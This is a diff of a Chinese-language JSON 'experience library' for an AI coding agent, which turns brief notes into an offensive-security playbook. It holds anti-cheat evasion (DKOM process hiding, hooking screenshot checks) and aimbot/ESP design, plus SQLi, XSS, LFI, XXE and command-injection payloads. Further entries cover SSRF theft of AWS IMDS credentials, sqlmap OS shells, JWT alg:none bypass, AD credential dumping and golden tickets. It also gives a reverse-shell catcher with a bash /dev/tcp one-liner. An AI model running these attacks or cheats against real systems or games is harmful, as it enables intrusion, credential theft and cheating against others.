@@ -1,63 +1,454 @@
 {
-  "description": "海鸥代码经验库 - 记录写过的代码模式和经验",
+  "description": "牛逼倒立仓库 - 知识经验库（来自600+目标实战 + 大神开源项目）",
   "last_updated": "2026-07-02",
+  "data_sources": [
+    "recon-skills - 212项技术，600+目标验证",
+    "gamehacking-cheatsheet - 游戏逆向大全",
+    "web-vulnerabilities-cheat-sheets - Web漏洞速查",
+    "bug-bounty-methodology - 赏金猎人大神方法论",
+    "PayloadsAllTheThings - 全payload集合"
+  ],
   "patterns": [
     {
-      "id": "unity-il2cpp-hook",
+      "id": "game-unity-il2cpp-hook",
       "category": "游戏逆向",
-      "description": "Unity IL2CPP游戏Hook流程",
+      "description": "Unity IL2CPP游戏Hook完整流程",
       "steps": [
-        "用Il2CppDumper dump global-metadata.dat + libil2cpp.so",
-        "用IDA分析dump.cs找目标类和偏移",
-        "用Frida或C++注入器Hook"
+        "1. 用Il2CppDumper dump global-metadata.dat + libil2cpp.so",
+        "2. 用IDA Pro分析dump.cs，找目标类和函数偏移",
+        "3. 用Frida脚本 hook目标函数：Interceptor.attach(ptr(address), ...)",
+        "4. 或者用C++写注入器：CreateRemoteThread + 手动映射",
+        "5. 对于IL2CPP，函数参数和返回值都在Il2CppCodeGen模块中"
       ],
-      "notes": "IL2CPP的metadata版本必须匹配，否则dump出来的偏移不对"
+      "tools": ["Il2CppDumper", "IDA Pro", "Frida", "x64dbg"],
+      "notes": "IL2CPP metadata版本必须匹配！否则dump出来的偏移全错。Unity版本号在global-metadata.dat头部的字符串里"
     },
     {
-      "id": "unreal-dump-sdk",
+      "id": "game-unreal-dump-sdk",
       "category": "游戏逆向",
-      "description": "Unreal Engine游戏dump SDK",
+      "description": "Unreal Engine游戏dump SDK + 逆向",
       "steps": [
-        "用UE4SS注入游戏",
-        "用Dumpers插件dump UObject",
-        "生成SDK头文件"
+        "1. 用UE4SS（Unreal Engine 4/5 Scripting System）注入游戏进程",
+        "2. 用Dumpers插件导出UObject、GNames、GObjects",
+        "3. 生成SDK头文件（包含所有类、结构体、偏移）",
+        "4. 用IDA加载游戏主模块，定位关键函数",
+        "5. 写Cheat用C++ external模式，读GObjects遍历实体"
       ],
-      "notes": "UE4SS版本要和游戏引擎版本匹配"
+      "tools": ["UE4SS", "IDA Pro", "ReClass.NET", "Cheat Engine"],
+      "notes": "UE4SS版本必须匹配游戏引擎版本。不同引擎版本的GObject偏移不同。Unreal 4.27和Unreal 5.x差异很大"
     },
     {
-      "id": "memory-address-find",
+      "id": "game-memory-address-find",
       "category": "内存修改",
-      "description": "找游戏内存地址通用方法",
+      "description": "通用内存地址搜索方法论",
       "steps": [
-        "CE搜血量/坐标/经验值",
-        "找基址+偏移链",
-        "验证地址稳定性"
+        "1. 用CE（Cheat Engine）附加游戏进程",
+        "2. 搜索已知值（血量/坐标/经验），精确扫描",
+        "3. 改变游戏内数值，搜变化后的值",
+        "4. 重复直到找到唯一地址",
+        "5. 右键→找出是什么访问了这个地址（定位代码）",
+        "6. 找基址+多级偏移链：[[[base+0x1A8]+0x30]+0x28]+0x10",
+        "7. 用FindPointer扫描器验证偏移链稳定性"
       ],
-      "notes": "多级指针偏移在游戏更新后可能变，要重新找"
+      "tools": ["Cheat Engine", "ReClass.NET", "x64dbg"],
+      "notes": "即使基址是动态的，模块基址+偏移链是稳定的。游戏更新后可能变偏移，但模式扫描更可靠。多级指针偏移在游戏更新后可能变，要重新找"
     },
     {
-      "id": "mitm-proxy-analyze",
+      "id": "game-anti-cheat-bypass",
+      "category": "游戏逆向",
+      "description": "常见反外挂绕过技术",
+      "steps": [
+        "1. 识别反外挂类型：EAC/BattlEye/Vanguard/ACE/TenProtect",
+        "2. 内核级：EAC和Vanguard有内核驱动，需要用内核驱动对抗",
+        "3. 用户态：BattlEye和ACE主要用户态hook检测",
+        "4. 通用绕过：驱动级隐藏进程（DKOM隐藏EPROCESS）",
+        "5. 内存隐藏：修改页表属性，从用户态隐藏内存区域",
+        "6. 通信隐藏：自定义通信协议，不走CreateFile/DeviceIoControl"
+      ],
+      "tools": ["WinDbg", "IDA Pro", "x64dbg", "VT-x"],
+      "notes": "EAC和Vanguard会扫描内核回调，需要清理。BattlEye的线程命名检测可以通过改线程名绕过。ACE有截图检测，需要hook截图API"
+    },
+    {
+      "id": "game-esp-aimbot",
+      "category": "游戏逆向",
+      "description": "透视+自瞄通用实现框架",
+      "steps": [
+        "1. 找到EntityList和玩家的结构体偏移",
+        "2. 找到ViewMatrix（世界→屏幕投影矩阵）",
+        "3. w2s函数：ViewMatrix * 3D坐标 → 屏幕坐标",
+        "4. ESP绘制：在屏幕坐标画Box/骨骼/血量/名字",
+        "5. 自瞄：算相机到敌人头部的角度，写回相机角度",
+        "6. 实现方式：DX Hook（Present/EndScene）或者外部Overlay"
+      ],
+      "tools": ["DX Hook", "ImGui", "DirectX Overlay"],
+      "notes": "w2s公式：clip = ViewMatrix * worldPos; screen.x = clip.x/clip.w * screenWidth/2 + centerX; OpenGL和DX的ViewMatrix不一样"
+    },
+    {
+      "id": "recon-subdomain-enum",
+      "category": "信息收集",
+      "description": "子域名枚举完整流程（大神方法论）",
+      "steps": [
+        "1. 被动枚举：subfinder -d target.com | 保存",
+        "2. 证书透明：curl -s 'https://crt.sh/?q=%.target.com&output=json'",
+        "3. 搜索引擎：Google dork 'site:target.com -www'",
+        "4. DNS爬虫：amass enum -d target.com",
+        "5. 拼接生成：dnsgen 子域名列表 → massdns 验证",
+        "6. 最后合并去重：sort -u all-subs.txt"
+      ],
+      "tools": ["subfinder", "amass", "crt.sh", "dnsgen", "massdns"],
+      "notes": "80%的成功来自侦察（recon），侦察做得越好，漏洞找得越多。先用被动减少攻击性"
+    },
+    {
+      "id": "recon-httpx-probe",
+      "category": "信息收集",
+      "description": "批量HTTP存活探测+指纹识别",
+      "steps": [
+        "1. 从subfinder拿到子域名列表",
+        "2. httpx -l subs.txt -status-code -title -tech-detect -ports 80,443,8080,8443",
+        "3. httpx自动识别：Web框架、WAF、CDN、操作系统",
+        "4. 输出格式：JSON方便后续解析",
+        "5. 按status_code分类：200的优先深入"
+      ],
+      "tools": ["httpx"],
+      "notes": "httpx的-tech-detect靠HTTP头+HTML特征识别，准确率很高。配合nuclei使用更无敌"
+    },
+    {
+      "id": "recon-url-crawl",
+      "category": "信息收集",
+      "description": "全面URL收集方法论",
+      "steps": [
+        "1. katana 爬虫：katana -u https://target.com -d 3 -o urls.txt",
+        "2. 历史源：gau target.com → waybackurls target.com",
+        "3. JS爬取：gospider -s https://target.com",
+        "4. 合并去重：sort -u all-urls.txt",
+        "5. 过滤参数：cat all-urls.txt | grep '?' > params.txt"
+      ],
+      "tools": ["katana", "gau", "waybackurls", "gospider"],
+      "notes": "gau和waybackurls能拿到历史版本的URL，经常能发现旧版API和调试端点。katana适合刷新当前版本"
+    },
+    {
+      "id": "web-xss-scan",
+      "category": "Web渗透",
+      "description": "XSS自动化检测+利用",
+      "steps": [
+        "1. 参数发现：arjun -u https://target.com/page",
+        "2. 反射XSS扫描：dalfox url --blind https://your.xss.ht",
+        "3. 存储XSS扫描：nuclei -t xss/ -l urls.txt",
+        "4. 盲XSS：插入通用XSS payload，用XSShunter接收",
+        "5. 手动验证反射点：'/><script>alert(1)</script>"
+      ],
+      "tools": ["dalfox", "nuclei", "XSStrike", "arjun"],
+      "notes": "XSS三件套：Dalfox自动扫 + Nuclei模板扫 + 手动验证。别忘了检查WAF绕过：大小写/编码/注释"
+    },
+    {
+      "id": "web-sqli-test",
+      "category": "Web渗透",
+      "description": "SQL注入完整利用流程",
+      "steps": [
+        "1. 找注入点：参数中添加' \" ) 看报错和响应变化",
+        "2. 时间盲注：' AND SLEEP(5)-- 看响应时间",
+        "3. 自动化：sqlmap -u https://target.com/page?id=1 --batch",
+        "4. 高级：sqlmap --tamper=space2comment --random-agent --level 3",
+        "5. 文件读取：sqlmap --file-read=/etc/passwd",
+        "6. getshell：sqlmap --os-shell（需要文件写入权限）"
+      ],
+      "tools": ["sqlmap", "Ghauri"],
+      "notes": "sqlmap的--level和--risk影响检测深度。Level 3+才能测到Cookie/Header注入。WAF绕过用tamper脚本"
+    },
+    {
+      "id": "web-ssrf-test",
+      "category": "Web渗透",
+      "description": "SSRF检测+利用方法论",
+      "steps": [
+        "1. 找可能发起请求的功能：文件导入、URL预览、Webhook、图片处理",
+        "2. 测试：用collaborator/interactsh检测带外请求",
+        "3. SSRFmap扫描：ssrfmap -r request.txt -p param",
+        "4. 绕过：127.0.0.1 → 2130706433（整数IP）→ [::1] → 0x7f.0.0.1",
+        "5. 云环境利用：AWS IMDS 169.254.169.254 → IAM凭证窃取",
+        "6. 内网探测：用SSRF扫内部端口和服务"
+      ],
+      "tools": ["interactsh-client", "SSRFmap", "Gopherus"],
+      "notes": "interactsh-client启动后，用生成的子域名作为payload。IMDSv2需要token头，简单SSRF可能不够。先确认目标在云上"
+    },
+    {
+      "id": "web-bugbounty-full-workflow",
+      "category": "Web渗透",
+      "description": "Bug Bounty完整工作流（大神方法论综合）",
+      "steps": [
+        "Phase 1 - 攻击面发现：",
+        "  subfinder -d target.com | httpx -silent | tee live-subs.txt",
+        "  nuclei -l live-subs.txt -t ~/nuclei-templates/ -severity critical",
+        "",
+        "Phase 2 - 参数和端点发现：",
+        "  katana -list live-subs.txt -d 3 | grep '?' | tee params.txt",
+        "  arjun -i live-subs.txt -oT params-found.txt",
+        "  cat live-subs.txt | getJS | tee js-files.txt",
+        "",
+        "Phase 3 - 自动漏洞扫描：",
+        "  nuclei -l live-subs.txt -t ~/nuclei-templates/ -o vulns.txt",
+        "  dalfox file params.txt --custom-payload xss-payloads.txt",
+        "  sqlmap -m params.txt --batch --level 2",
+        "",
+        "Phase 4 - 手动深入测试：",
+        "  JWT token伪造/绕过",
+        "  IDOR：修改UUID/user_id看能否访问他人数据",
+        "  GraphQL探测：query{__schema{types{name}}}",
+        "  SSRF：interactsh检测带外交互",
+        "",
+        "Phase 5 - JS秘密提取：",
+        "  cat js-files.txt | xargs -I{} sh -c 'curl -s {} | grep -iE \"apikey|secret|token|password\"'"
+      ],
+      "tools": ["subfinder", "httpx", "nuclei", "katana", "arjun", "dalfox", "sqlmap", "interactsh"],
+      "notes": "80%成功来自侦查，自动化90%，人工深入10%。关注无聊端点：/health /metrics /console。错误消息是程序在告诉你秘密"
+    },
+    {
+      "id": "web-attack-patterns",
+      "category": "Web渗透",
+      "description": "25个经600+目标验证的攻击模式（recon-skills项目）",
+      "attack_patterns": [
+        {"id": "P-01", "name": "WordPress REST API User Enumeration", "severity": "Medium", "detection": "curl -sk 'TARGET/wp-json/wp/v2/users' 返回用户信息"},
+        {"id": "P-02", "name": "CORS Origin Reflection with Credentials", "severity": "Critical", "detection": "Origin: https://evil.com → ACAO: https://evil.com + ACAC: true"},
+        {"id": "P-03", "name": "CORS Null Origin Trust", "severity": "High", "detection": "Origin: null → ACAO: null，可被sandboxed iframe利用"},
+        {"id": "P-07", "name": "XMLRPC system.multicall Brute Force", "severity": "High", "detection": "system.multicall允许1000x爆破加速"},
+        {"id": "P-08", "name": "XMLRPC pingback.ping SSRF", "severity": "High", "detection": "pingback到collaboratorURL确认SSRF"},
+        {"id": "P-09", "name": "XMLRPC IMDS Role Guessing", "severity": "Critical", "detection": "SSRF探AWS IMDS 169.254.169.254获取IAM凭证"},
+        {"id": "P-10", "name": "Open Registration → Upload → RCE", "severity": "Critical", "detection": "检查/wp-login.php?action=register是否开放"},
+        {"id": "P-14", "name": "Staging WordPress Install Pages", "severity": "Critical", "detection": "/wp-admin/install.php返回200 → 可直接搭自己的admin"},
+        {"id": "P-15", "name": "Error Log Credential Mining", "severity": "High", "detection": "/error_log包含PHP错误和SQL查询"},
+        {"id": "P-16", "name": "PHPInfo Exec Function Check", "severity": "High", "detection": "/info.php显示exec/system/passthru等函数可用"},
+        {"id": "P-17", "name": "Source Leak Mass Scan", "severity": "Critical", "detection": "扫.env/wp-config/debug.log/backup.sql等敏感文件"},
+        {"id": "P-18", "name": "JavaScript Bundle Secret Extraction", "severity": "Critical", "detection": "JS中grep API密钥/JWT/Stripe密钥"},
+        {"id": "P-19", "name": "MySQL Port 3306 Public", "severity": "Critical", "detection": "nmap发现3306开放，尝试默认口令连接"}
+      ],
+      "notes": "来自recon-skills项目，600+生产目标，28个行业验证。优先检查Critical级别的模式",
+      "source": "https://github.com/uphiago/recon-skills"
+    },
+    {
+      "id": "auth-bypass-techniques",
+      "category": "Web渗透",
+      "description": "认证绕过通用技术",
+      "steps": [
+        "1. 默认凭证：admin:admin, root:root, test:test",
+        "2. JWT攻击：alg:none绕过、弱密钥爆破(jwt_tool)、kid注入",
+        "3. 2FA绕过：直接访问dashboard URL、修改响应包、重放旧token",
+        "4. 密码重置：Host头污染、token预测、重置链接劫持",
+        "5. OAuth：redirect_uri劫持、state参数缺失、code泄露",
+        "6. Session固定：攻击者先获取session，诱导用户用该session登录"
+      ],
+      "tools": ["jwt_tool", "Burp Suite", "mitmproxy"],
+      "notes": "JWT的alg:none攻击最简单：把alg改成none，删掉signature部分，看后端是否验证签名"
+    },
+    {
+      "id": "api-graphql-test",
+      "category": "Web渗透",
+      "description": "GraphQL API安全测试方法论",
+      "steps": [
+        "1. 检测：curl https://target.com/graphql -d 'query{__schema{types{name}}}'",
+        "2. 如果开启introspection，用clairvoyance dump完整schema",
+        "3. 查询泄露：query中加limit/offset参数看是否限制",
+        "4. 批量查询：GraphQL batching（暴力枚举用户ID）",
+        "5. 注入：在GraphQL参数中测试SQLi/NoSQLi",
+        "6. 认证绕过：检查mutation是否要auth"
+      ],
+      "tools": ["clairvoyance", "graphql-cop", "graphw00f", "InQL"],
+      "notes": "GraphQL introspection默认开启！如果没关，整个API的数据模型全部暴露。关闭introspection后可以用field suggestion猜字段名"
+    },
+    {
+      "id": "android-reverse",
+      "category": "移动安全",
+      "description": "Android APK逆向完整流程",
+      "steps": [
+        "1. 解包：apktool d app.apk -o output/",
+        "2. Java反编译：jadx-gui app.apk（直接看Java源码）",
+        "3. 如果是Flutter：用blutter或reFlutter",
+        "4. 如果是Unity：用Il2CppDumper处理libil2cpp.so",
+        "5. Native库分析：IDA Pro加载lib/armeabi-v7a/*.so",
+        "6. 抓包：Android 7+需要安装用户证书+修改网络安全配置"
+      ],
+      "tools": ["apktool", "jadx", "Frida", "IDA Pro", "objection"],
+      "notes": "Android 7+默认不信任用户证书，抓HTTPS需要：1) 安装mitmproxy CA到系统证书 2) 或者用Frida SSL Pinning绕过"
+    },
+    {
+      "id": "ios-reverse",
+      "category": "移动安全",
+      "description": "iOS应用逆向完整流程",
+      "steps": [
+        "1. 砸壳：frida-ios-dump 或 Clutch（从AppStore下载的ipa有加密壳）",
+        "2. 反编译：class-dump 或 Ghidra 分析Mach-O",
+        "3. Object-C分析：Hopper Pro 或 IDA Pro",
+        "4. Swift分析：Ghidra + Swift插件",
+        "5. Frida hook：frida -U -l script.js -f com.target.app",
+        "6. 抓包：安装mitmproxy CA到iOS，设置代理"
+      ],
+      "tools": ["Frida", "Ghidra", "Hopper", "class-dump", "objection"],
+      "notes": "iOS砸壳需要越狱手机。如果没有越狱，可以用macOS的Gadget模式或者利用漏洞"
+    },
+    {
+      "id": "windows-privesc",
+      "category": "提权技术",
+      "description": "Windows提权检查清单",
+      "steps": [
+        "1. 运行winPEAS.bat（Privilege Escalation Awesome Scripts）",
+        "2. 检查系统信息：systeminfo | findstr /B /C:\"OS Name\"",
+        "3. 检查已安装补丁：wmic qfe list",
+        "4. 检查服务权限：sc qc servicename / accesschk.exe",
+        "5. 检查AlwaysInstallElevated注册表",
+        "6. 检查Token权限：whoami /priv（看有没有SeImpersonatePrivilege）",
+        "7. SeImpersonate → JuicyPotato/RoguePotato → SYSTEM"
+      ],
+      "tools": ["winPEAS", "accesschk", "JuicyPotato", "PrintSpoofer"],
+      "notes": "JuicyPotato在Windows Server 2019上可能不工作，换RoguePotato或PrintSpoofer。SeImpersonate是最常见的提权入口"
+    },
+    {
+      "id": "linux-privesc",
+      "category": "提权技术",
+      "description": "Linux提权检查清单",
+      "steps": [
+        "1. 运行linpeas.sh",
+        "2. SUID: find / -perm -4000 2>/dev/null",
+        "3. SUDO: sudo -l（看哪些命令可以不用密码跑）",
+        "4. 内核漏洞：uname -a → searchsploit查对应exp",
+        "5. 计划任务：ls -la /etc/cron* 找可写的脚本",
+        "6. 环境变量：LD_PRELOAD/LD_LIBRARY_PATH劫持",
+        "7. Docker逃逸：检查是否在容器内 /.dockerenv"
+      ],
+      "tools": ["linpeas", "GTFOBins", "searchsploit"],
+      "notes": "GTFOBins网站查每个SUID/SUDO命令的提权方法。LinPEAS自动检测90%的常见提权向量"
+    },
+    {
+      "id": "ad-attack",
+      "category": "内网渗透",
+      "description": "Active Directory攻击完整链",
+      "steps": [
+        "1. 侦察：BloodHound收集AD数据 → 分析攻击路径",
+        "2. kerberoasting：GetUserSPNs -> 离线爆破服务账户密码",
+        "3. AS-REP roasting：检测不需要Kerberos预认证的账户",
+        "4. 凭证转储：impacket-secretsdump -just-dc DOMAIN/Administrator@DC",
+        "5. 横向移动：impacket-psexec ADMIN/user:pass@target",
+        "6. DCSync：利用域管权限dump所有域用户的hash",
+        "7. 黄金票据：拿到krbtgt hash后伪造TGT"
+      ],
+      "tools": ["BloodHound", "Impacket", "Rubeus", "Mimikatz"],
+      "notes": "BloodHound + Neo4j分析最短到域管的路径。别直接打域管，走路径→提权→横向→域管。impacket的secretsdump支持-just-dc只dump域用户"
+    },
+    {
+      "id": "cloud-aws-pentest",
+      "category": "云安全",
+      "description": "AWS渗透测试方法论",
+      "steps": [
+        "1. S3枚举：cloud_enum -k target -m s3",
+        "2. IAM枚举：枚举IAM用户和权限，检查过度授权",
+        "3. Lambda检查：看是否有敏感环境变量",
+        "4. EC2元数据：利用SSRF打169.254.169.254/latest/meta-data/",
+        "5. 凭证泄露：检查公共仓库和JS中的AWS Keys",
+        "6. ECS/RDS：检查数据库和容器服务是否公开"
+      ],
+      "tools": ["cloudfox", "pacu", "cloud_enum"],
+      "notes": "aws s3 ls s3://bucket-name 不需要认证就能列出公开桶。ScoutSuite能自动审计AWS配置"
+    },
+    {
+      "id": "protocol-mitm-analyze",
       "category": "协议分析",
-      "description": "中间人抓包分析游戏通信协议",
+      "description": "中间人抓包分析+游戏协议逆向",
       "steps": [
-        "启动mitmproxy监听8080",
-        "设置客户端代理到本地",
-        "安装mitmproxy CA证书",
-        "分析请求/响应结构",
-        "识别加密/编码算法"
+        "1. 启动mitmproxy：mitmweb --listen-port 8080",
+        "2. 设置客户端代理到127.0.0.1:8080",
+        "3. 安装mitmproxy CA证书到系统（抓HTTPS必须）",
+        "4. 分析请求结构：URL/Header/Body",
+        "5. 如果数据是乱码（二进制/加密）：",
+        "   a. 先用strings看有没有明文特征",
+        "   b. 用IDA分析客户端看加密函数",
+        "   c. 常见的：AES-CBC、XOR、RC4、自定义异或",
+        "6. 编解码: base64 → hex → JSON → protobuf",
+        "7. 修改请求/响应：mitmproxy的inline脚本"
       ],
-      "notes": "私服可能用自定义加密，需要先逆向解密函数"
+      "tools": ["mitmproxy", "Wireshark", "tcpdump", "IDA Pro"],
+      "notes": "如果是protobuf，需要找到.proto文件或逆向出消息结构。私服常用自定加密协议，比标准协议难分析10倍"
     },
     {
-      "id": "nuclei-scan",
-      "category": "漏洞扫描",
-      "description": "Nuclei模板化扫描",
+      "id": "protocol-binary-reverse",
+      "category": "协议分析",
+      "description": "二进制协议逆向方法",
       "steps": [
-        "nuclei -u target.com -t cves/",
-        "nuclei -u target.com -t exposures/",
-        "nuclei -u target.com -t misconfigurations/"
+        "1. Wireshark先看UDP/TCP流，找固定结构的包",
+        "2. 同一操作发多次，对比包的不同部分",
+        "3. 常见的包结构：[magic(2B)] [length(2B)] [seq(4B)] [type(2B)] [data(N)] [crc(4B)]",
+        "4. length字段是整个包长还是数据段长？根据数据推测",
+        "5. 加密识别：数据是否均匀分布（卡方检验）",
+        "6. 用Frida hook send/recv相关函数定位序列化和加密",
+        "7. 用Python的struct模块解析二进制结构"
       ],
-      "notes": "先httpx探测存活，再nuclei扫描，效率更高"
+      "tools": ["Wireshark", "Frida", "IDA Pro", "Python struct"],
+      "notes": "length字段是分析二进制协议的关键入口。找到加密函数后用Frida hook住，在加密前/解密后dump数据"
+    },
+    {
+      "id": "cve-poc-template",
+      "category": "漏洞利用",
+      "description": "CVE PoC编写方法论",
+      "steps": [
+        "1. 理解漏洞原理：读CVE描述和分析文章",
+        "2. 找影响版本：确认目标版本是否在影响范围内",
+        "3. 搭建复现环境：Docker或vagrant",
+        "4. 编写PoC：从POC验证到完整利用",
+        "5. 编写Nuclei模板：自动检测",
+        "6. 集成到工具：添加到自动化流程"
+      ],
+      "tools": ["nuclei", "Docker", "Python", "metasploit"],
+      "notes": "Nuclei模板编写最快。从公开CVE PoC改成Nuclei YAML模板只要10-30分钟。优先关注9.0+评分的CVE"
+    },
+    {
+      "id": "payload-all-the-things",
+      "category": "漏洞利用",
+      "description": "常见漏洞Payload速查",
+      "payloads": {
+        "sqli": ["' OR 1=1--", "' UNION SELECT 1,2,3--", "'; DROP TABLE users--", "' AND SLEEP(5)--"],
+        "xss": ["<script>alert(1)</script>", "\" onmouseover=\"alert(1)\"", "<img src=x onerror=alert(1)>", "javascript:alert(1)"],
+        "ssrf": ["http://127.0.0.1:80", "http://169.254.169.254/", "file:///etc/passwd", "gopher://internal:6379"],
+        "lfi": ["../../../etc/passwd", "....//....//etc/passwd", "file:///etc/passwd", "php://filter/convert.base64-encode/resource=index"],
+        "ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"],
+        "cmd-inject": ["; whoami", "| whoami", "`whoami`", "$(whoami)"],
+        "jwt": ["alg:none, payload: admin", "kid: ../../../dev/null -> secret为空"],
+        "xxe": ["<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"]
+      },
+      "notes": "先试最简单的payload，不行再上复杂绕WAF的。PayloadsAllTheThings项目里所有类型的payload都有",
+      "source": "https://github.com/swisskyrepo/PayloadsAllTheThings"
+    },
+    {
+      "id": "shell-reverse-catch",
+      "category": "漏洞利用",
+      "description": "反弹Shell接收方法",
+      "steps": [
+        "1. 监听：nc -lvnp 4444",
+        "2. 或者用：rlwrap nc -lvnp 4444（有历史命令）",
+        "3. 升级shell：python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
+        "4. 再升级：Ctrl+Z → stty raw -echo → fg → reset",
+        "5. 或者用socat：socat file:`tty`,raw,echo=0 tcp-listen:4444"
+      ],
+      "tools": ["nc", "rlwrap", "socat", "Metasploit multi/handler"],
+      "notes": "Windows的反弹shell用powershell -e base64编码的命令。Linux用bash -i >& /dev/tcp/IP/PORT 0>&1"
+    },
+    {
+      "id": "claude-mcp-memory-workflow",
+      "category": "记忆系统",
+      "description": "每次会话自动执行的记忆加载和审查流程",
+      "steps": [
+        "每次会话开始：",
+        "1. 加载大脑：cat /c/Users/Administrator/niubi-daoli-cangku/memory/projects/*.md",
+        "2. 查代码经验：检查code/patterns.json匹配任务关键词",
+        "3. 查踩坑：检查error-log.json和errors/initial-known-issues.md",
+        "4. 查工具版本：检查versions/tools.json",
+        "",
+        "干活中：",
+        "5. 写代码前用deslint审查，写完用vibecop扫描",
+        "6. 发现旧代码模式→按当前patterns.json最新的来",
+        "",
+        "干完活：",
+        "7. 更新projects/记录本次干了啥",
+        "8. 如果发现新经验→更新patterns.json",
+        "9. 如果踩坑→更新errors/",
+        "10. git commit + push 到GitHub备份大脑"
+      ],
+      "notes": "这是老子的核心工作流程，每次会话必须执行！CLAUDE.md里写死了这个流程"
     }
   ]
 }
